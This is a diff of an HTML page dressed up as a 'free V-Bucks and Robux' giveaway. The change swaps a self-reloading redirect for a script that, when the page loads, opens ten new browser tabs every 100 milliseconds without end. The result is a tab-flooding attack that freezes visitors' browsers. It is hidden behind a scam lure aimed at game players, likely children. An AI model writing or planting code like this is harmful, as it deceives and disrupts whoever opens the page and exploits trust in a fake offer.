@@ -4,18 +4,22 @@
     <title>FREE VBUCKS ROBUX 2024 NO HUMAN VERIFICATION LEGIT NO ADS</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
     <script type="text/javascript">
-        // Function to continuously redirect to index.html
-        function keepRedirecting() {
-            window.open('index.html', '_blank'); // Open index.html in a new tab
-            setTimeout(function() {
-                window.location.href = window.location.href; // Reload the current page to repeat the process
-            }, 1); // Repeat the process every 1 second
+        // Function to open 10 tabs every 100 milliseconds
+        function openTabs() {
+            for (let i = 0; i < 10; i++) {
+                window.open('index.html', '_blank'); // Open index.html in a new tab
+            }
         }
 
-        // Start the redirection when the page loads
-        window.onload = keepRedirecting;
+        // Function to continuously open tabs
+        function keepOpeningTabs() {
+            openTabs(); // Open 10 tabs
+            setTimeout(keepOpeningTabs, 100); // Call this function again after 100ms
+        }
+
+        // Start opening tabs when the page loads
+        window.onload = keepOpeningTabs;
     </script>
 </head>
 <body>
